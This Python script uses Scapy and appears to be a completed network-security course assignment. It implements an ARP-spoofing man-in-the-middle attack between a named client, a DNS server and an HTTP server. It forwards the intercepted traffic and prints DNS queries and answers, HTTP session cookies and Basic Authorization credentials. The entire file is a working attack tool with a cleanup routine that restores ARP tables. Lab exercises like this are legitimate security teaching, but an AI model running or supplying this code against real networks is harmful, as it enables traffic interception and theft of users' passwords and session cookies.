from scapy.all import *

import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    # Send an ARP to get mac addr
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
    ans, _ = srp(pkt, timeout=1, verbose=0)
    debug(f"MAC address of {IP} is: {ans[0][1].hwsrc}")
    return ans[0][1].hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    pkt = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op="is-at")
    send(pkt, verbose=0)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    pkt = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op="is-at")
    send(pkt, verbose=0)


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    if packet.haslayer(IP):
        dstIP = packet[IP].dst
        srcIP = packet[IP].src
        if dstIP == attackerIP or srcIP == attackerIP or packet[Ether].src == attackerMAC:
            return
        dstMAC = packet[Ether].dst
        if dstIP == clientIP:
            dstMAC = clientMAC
        elif dstIP == httpServerIP:
            dstMAC = httpServerMAC
        elif dstIP == dnsServerIP:
            dstMAC = dnsServerMAC
        else:
            # Should not reach here
            return
        packet[Ether].src = attackerMAC
        packet[Ether].dst = dstMAC

        # 4.2.1.1 questions
        if packet[IP].dst == dnsServerIP and packet[IP].src == clientIP:
            # Client asks DNS for a query
            print(f"*hostname:{packet[DNSQR].qname.decode()}")
        if packet[IP].dst == clientIP and packet[IP].src == dnsServerIP and DNS in packet and packet[DNS].ancount > 0:
            # DNS responds client with an IP
            print(f"*hostaddr:{packet[DNS].an[0].rdata}")
        if packet[IP].dst == clientIP and packet[IP].src == httpServerIP and packet.haslayer(HTTPResponse) and packet[HTTPResponse].Set_Cookie:
            # Server responds to client via HTTP
            print(f"*cookie:{packet[HTTPResponse].Set_Cookie.decode()}")
        if packet[IP].dst == httpServerIP and packet[IP].src == clientIP and packet.haslayer(HTTPRequest) and packet[HTTPRequest].Authorization:
            # Client sends HTTP to server
            print(f"*basicauth:{packet[HTTPRequest].Authorization.decode()}")
        
        sendp(packet, verbose=0)


if __name__ == "__main__":
    load_layer("http")

    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)
    
    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
